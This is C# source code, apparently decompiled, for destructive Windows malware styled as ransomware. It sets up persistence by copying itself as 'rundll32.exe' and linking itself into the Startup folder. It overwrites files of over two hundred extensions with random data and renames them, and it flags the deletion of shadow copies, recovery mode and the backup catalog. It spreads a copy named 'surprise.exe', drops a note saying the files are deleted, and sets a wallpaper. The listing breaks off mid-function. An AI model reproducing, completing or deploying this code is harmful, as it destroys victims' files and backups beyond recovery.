using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = false;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "rundll32.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "ntdfrag.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[12]
	{
		"Your Computer May Well Be Better Than Mine, But Not Anymore ", "This is a one way ticket to hell for your computer.", "Good News:-", "Your Files Are Not Encrypted", "Bad News:-", "They're Deleted.", "Now Watch As Your Computer Suffers", "Ok, that's a little too much of drama..", "You Do Not Have To Send Any Money, Neither I Get Any Money.", "No Bitcoin Or Dogecoin Needed.",
		";-(", "===================================================="
	};

	private static string[] validExtensions = new string[231]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d", ".exe",
		".bat"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
